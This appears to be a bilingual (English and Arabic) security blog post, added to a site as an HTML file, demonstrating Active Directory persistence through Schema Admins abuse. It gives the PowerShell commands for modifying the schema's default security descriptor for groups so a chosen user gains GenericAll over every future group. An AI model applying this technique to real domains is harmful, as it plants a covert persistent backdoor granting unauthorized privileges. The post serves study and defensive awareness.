@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Schema Admins | Jehad Alqurashi</title>
+<link rel="stylesheet" href="../assets/css/style.css">
+</head>
+<body>
+<div class="nav-wrapper" id="nav-wrapper">
+<nav class="nav">
+<div class="logo">
+<a href="../index.html"><span class="logo-icon">JA</span>Jehad Alqurashi</a>
+</div>
+<ul class="menu">
+<li><a href="../index.html">Home</a></li>
+<li><a href="../tags.html">Tags</a></li>
+</ul>
+</nav>
+</div>
+<div class="reading-progress"><div class="reading-progress-bar" id="reading-bar"></div></div>
+<main class="main">
+<div class="breadcrumb">
+<a href="../index.html">Home</a><span class="sep">/</span><a href="../tags.html">active-directory</a><span class="sep">/</span><span>Schema Admins</span>
+</div>
+<article class="post-single">
+<header class="post-header">
+<div class="post-meta">
+<span class="post-category">active-directory</span>
+<span class="post-date">2023-12-28</span>
+</div>
+<h1 class="post-title">Schema Admins</h1>
+</header>
+<div class="lang-tabs">
+<button class="lang-tab active" onclick="switchLang('en',this)">English</button>
+<button class="lang-tab" onclick="switchLang('ar',this)">Arabic</button>
+</div>
+<div id="content-en" class="post-content">
+<h2>Introduction</h2>
+<h3>What is the Schema Admins Group?</h3>
+<p>This group allows modification of the Active Directory schema (structure). If any user or machine is a member of the Schema Admins group, they have the ability to designate a user or machine to have full control over any newly created group.</p>
+<h2>Walkthrough</h2>
+
+<figure class="article-img"><img src="../assets/images/schema-admins/1.png" alt="Step 1" loading="lazy"></figure>
+<h3>Step 1: Load the AD Module</h3>
+<p>First, we will load the Active Directory module using the appropriate PowerShell command.</p>
+<h3>Step 2: Verify Schema Admins Membership</h3>
+<p>We are logged in as the user <code>jehad</code>, and the user <code>jehad</code> is a member of the Schema Admins group.</p>
+
+<figure class="article-img"><img src="../assets/images/schema-admins/2.png" alt="Step 2" loading="lazy"></figure>
+<h3>Step 3: Plan the Attack</h3>
+<p>Now we will execute a command that enables us to obtain Full Control over any newly created group. But before executing the command, we need to determine which user or machine we want to grant Full Control to when a new group is created.</p>
+<p>We will of course specify the user <code>jehad</code>, so we first need to extract the SID for <code>jehad</code> using the following command:</p>
+<pre><code class="language-powershell">get-aduser jehad | select SID
+</code></pre>
+
+<figure class="article-img"><img src="../assets/images/schema-admins/3.png" alt="Step 3" loading="lazy"></figure>
+<h3>Step 4: Modify the Schema Default Security Descriptors</h3>
+<p>Now we will execute the following command, which modifies the default security descriptors of the Schema Admins group. All you need to do is replace <code>&lt;SID&gt;</code> with the SID of the user <code>jehad</code> that was extracted in the previous step:</p>
+<pre><code class="language-powershell">Set-ADObject -Identity &quot;CN=Group,CN=Schema,CN=Configuration,DC=&lt;DOMAIN&gt;,DC=local&quot; -Replace @{defaultSecurityDescriptor = 'D:(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;DA)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;SY)(A;;RPLCLORC;;;AU)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;&lt;SID&gt;)';} -Verbose
+</code></pre>
+<p>After executing the above command, the user <code>jehad</code> will have Full Control permissions on any newly created group from this point forward.</p>
+
+<figure class="article-img"><img src="../assets/images/schema-admins/4.png" alt="Step 4" loading="lazy"></figure>
+<h3>Step 5: Create a New Group and Verify Permissions</h3>
+<p>Now we will create a new group called <code>newAdmins</code> and check whether the user <code>jehad</code> has Full Control over the <code>newAdmins</code> group or not.</p>
+<p>After the <code>newAdmins</code> group has been created via the Domain Controller, we will run the following command to inspect the ACLs assigned to the user <code>jehad</code>:</p>
+<pre><code class="language-powershell">Find-InterestingDomainAcl
+</code></pre>
+<p>As we can see in the output, the user <code>jehad</code> has GenericAll permissions on the newly created <code>newAdmins</code> group. This means we can now add any user to this group.</p>
+<h3>Step 6: Add a User to the New Group</h3>
+<p>We can add our user to the <code>newAdmins</code> group using the following command:</p>
+<pre><code class="language-powershell">Add-ADGroupMember newAdmins -Members jehad -verbose
+</code></pre>
+<p>This confirms that by abusing Schema Admins membership, we can backdoor the Active Directory schema so that any future group created will grant us full control, providing a persistent privilege escalation path.</p>
+<figure class="article-img"><img src="../assets/images/schema-admins/5.png" alt="Step 5" loading="lazy"></figure>
+
+</div>
+<div id="content-ar" class="post-content rtl-content" style="display:none;direction:rtl;text-align:right;">
+<p>السلام عليكم ورحمة الله وبركاته</p>
+<p>الحمد لله على جميع نِعمه علينا ما علمنا منها وما لم نعلم حمداً والصلاة والسلام على نبينا محمد اشرف الخلق والمرسلين, اما بعد:</p>
+<p>مقدمة:</p>
+<p>ماهو قروب الـSchema Admins؟</p>
+<p>هذا القروب يسمح بالتعديل في الهيكلة الخاصة بالـActive Directory اذا اي مستخدم او جهاز ضمن قروب Schema Admins عنده إمكانية بتحديد مستخدم او جهاز يكون لدية تحكم كامل على اي قروب جديد يتم انشاءه.</p>
+<p>الشرح:</p>
+<p>في الاول راح نسوي Load لي الـAD Module عن طريق هذا الأمر...</p>
+<p>في بداية الامر انا داخل بالمستخدم jehad ,والمستخدم jehad ضمن قروب Schema Admins</p>
+<figure class="article-img"><img src="../assets/images/schema-admins/1.png" alt="Step 1" loading="lazy"></figure>
+
+<p>الان راح ننفذ امر هذا الامر راح يمكننا من الحصول Full Control على اي قروب جديد يتم انشاءه</p>
+<p>لكن قبل تنفيذ الامر يجب تحديد ماهو المستخدم او الجهاز اللذي تريده منه الحصول على Full Control عند انشاء قروب جديد</p>
+<p>انا طبعا راح احدد المستخدم jehad اذا يجب ان نستخرج الـSID الخاص في jehad عن طريق هذا الامر:</p>
+<figure class="article-img"><img src="../assets/images/schema-admins/2.png" alt="Step 2" loading="lazy"></figure>
+
+<p>get-aduser jehad | select SID</p>
+<p>الان راح ننفذ الامر التالي بحيث راح يتم التعديل في الـDescriptors الخاصة في قروب Schema Admins وكل اللي عليك تعوض محل &lt;SID&gt; بالـSID الخاص بالمستخدم jehad اللي تم استخراجه سابقا</p>
+<p>Set-ADObject -Identity "CN=Group,CN=Schema,CN=Configuration,DC=&lt;DOMAIN&gt;,DC=local" -Replace @{defaultSecurityDescriptor = 'D:(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;DA)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;SY)(A;;RPLCLORC;;;AU)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;&lt;SID&gt;)';} -Verbose</p>
+<figure class="article-img"><img src="../assets/images/schema-admins/3.png" alt="Step 3" loading="lazy"></figure>
+
+<p>الان بعد تنفيذ الامر السابق راح يكون لي المستخدم jehad صلاحية Full Control على اي قروب جديد يتم انشاءه</p>
+<p>الان راح انشأ قروب جديد اسمه newAdmins ونشوف هل المتسخدم jehad راح يكون عنده Full Control على القروب newAdmins او لا؟</p>
+<p>بعد ان تم انشاء قروب newAdmins عن طريق Domain Controller راح ننفذ هذا الامر حتى نشوف الـACLS الخاصة بالمستخدم jehad عن طريق هذا الامر:</p>
+<figure class="article-img"><img src="../assets/images/schema-admins/4.png" alt="Step 4" loading="lazy"></figure>
+
+<p>Find-InterestingDomainAcl</p>
+<p>زي مانلاحظ في الصورة السابقة ان المستخدم jehad لديه صلاحية GenericAll على القروب الجديد واللي هو newAdmins اذا يمكننا الان اضافة اي مستخدم الى هذ القروب عن طريق هذا الامر:</p>
+<p>Add-ADGroupMember newAdmins -Members jehad -verbose</p>
+<figure class="article-img"><img src="../assets/images/schema-admins/5.png" alt="Step 5" loading="lazy"></figure>
+
+<p>الى هنا وصلنا لنهاية المقالة اتمنى انها نالت على إعجابكم</p>
+<p>شاكر ومقدر لمتابعتكم</p>
+</div>
+<div class="post-nav">
+<a href="../index.html">&larr; Back to all articles</a>
+</div>
+</article>
+</main>
+<footer class="footer">
+<span>&copy; 2024 Jehad Alqurashi</span>
+<br><a href="#" class="top-link">&uarr; Back to top</a>
+</footer>
+<div class="night-bg" id="nightsky"></div>
+<div class="lightning"></div>
+<div class="rain-splash"></div>
+<script>
+(function(){
+  var c=document.getElementById('nightsky');
+  for(var i=0;i<5;i++){
+    var cl=document.createElement('div');
+    cl.className='cloud';
+    cl.style.top=(i*8+2)+'%';
+    cl.style.left='-20%';
+    cl.style.width=(200+i*80)+'px';
+    cl.style.height=(60+i*20)+'px';
+    cl.style.background='rgba(80,100,140,'+(0.03+i*0.01)+')';
+    cl.style.animationDuration=(60+i*20)+'s';
+    cl.style.animationDelay=(i*12)+'s';
+    c.appendChild(cl);
+  }
+  for(var i=0;i<120;i++){
+    var d=document.createElement('div');
+    d.className='rain-drop';
+    d.style.left=Math.random()*100+'%';
+    var far=Math.random();
+    if(far<0.5){
+      d.style.height=(Math.random()*18+14)+'px';
+      d.style.width='1.5px';
+      d.style.animationDuration=(Math.random()*0.4+0.4)+'s';
+      d.style.opacity=Math.random()*0.15+0.1;
+    } else {
+      d.style.height=(Math.random()*10+6)+'px';
+      d.style.width='0.5px';
+      d.style.animationDuration=(Math.random()*0.6+0.7)+'s';
+      d.style.opacity=Math.random()*0.08+0.03;
+    }
+    d.style.animationDelay=(Math.random()*2)+'s';
+    c.appendChild(d);
+  }
+  for(var i=0;i<20;i++){
+    var p=document.createElement('div');
+    p.className='particle';
+    p.style.left=Math.random()*100+'%';
+    p.style.width=p.style.height=(Math.random()*2+1)+'px';
+    p.style.background=Math.random()>0.5?'rgba(0,212,255,0.3)':'rgba(139,92,246,0.2)';
+    p.style.animationDuration=(Math.random()*15+10)+'s';
+    p.style.animationDelay=(Math.random()*10)+'s';
+    c.appendChild(p);
+  }
+})();
+</script>
+<script>
+window.addEventListener('scroll',function(){
+  var nw=document.getElementById('nav-wrapper');
+  if(nw) nw.classList.toggle('scrolled',window.scrollY>20);
+});
+</script>
+<script>
+function switchLang(lang, btn) {
+  document.querySelectorAll('.lang-tab').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+  document.getElementById('content-en').style.display = lang === 'en' ? '' : 'none';
+  document.getElementById('content-ar').style.display = lang === 'ar' ? '' : 'none';
+}
+</script>
+<script>
+window.addEventListener('scroll',function(){
+  var bar=document.getElementById('reading-bar');
+  if(!bar)return;
+  var h=document.documentElement.scrollHeight-window.innerHeight;
+  bar.style.width=h>0?Math.min(100,window.scrollY/h*100)+'%':'0%';
+});
+document.addEventListener('click',function(e){
+  if(e.target.closest('.article-img img')){
+    var src=e.target.src;
+    var ov=document.createElement('div');
+    ov.className='lightbox-overlay';
+    ov.innerHTML='<img src="'+src+'" alt="Zoomed">';
+    document.body.appendChild(ov);
+    setTimeout(function(){ov.classList.add('active');},10);
+    ov.onclick=function(){ov.classList.remove('active');setTimeout(function(){ov.remove();},300);};
+  }
+});
+</script>
+</body>
+</html>
